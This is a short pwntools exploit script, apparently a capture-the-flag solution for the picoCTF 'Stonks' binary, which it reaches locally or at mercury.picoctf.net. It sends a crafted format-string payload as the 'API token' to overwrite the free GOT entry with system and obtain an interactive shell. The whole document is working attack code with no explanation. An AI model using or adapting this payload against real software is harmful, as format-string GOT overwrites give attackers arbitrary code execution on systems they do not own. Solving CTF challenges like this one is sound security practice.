from pwn import *
elf = ELF("./vuln")

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		# "b *buy_stonks+229",
		"b *buy_stonks+224",
		"c"
	]))
elif args.REMOTE:
	p = remote("mercury.picoctf.net", 5654)
else:
	p = process(elf.path) 

print(f'free {hex(elf.got["free"])}')

# free -> system, overwrite Portfolio chunk to store 'sh\x00'
p.sendlineafter(b'2) View my portfolio\n', b'1')
payload = '%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%18$n'
print(payload)
p.sendlineafter(b'What is your API token?\n', payload.encode())
p.recvuntil(b'Portfolio')

p.interactive()



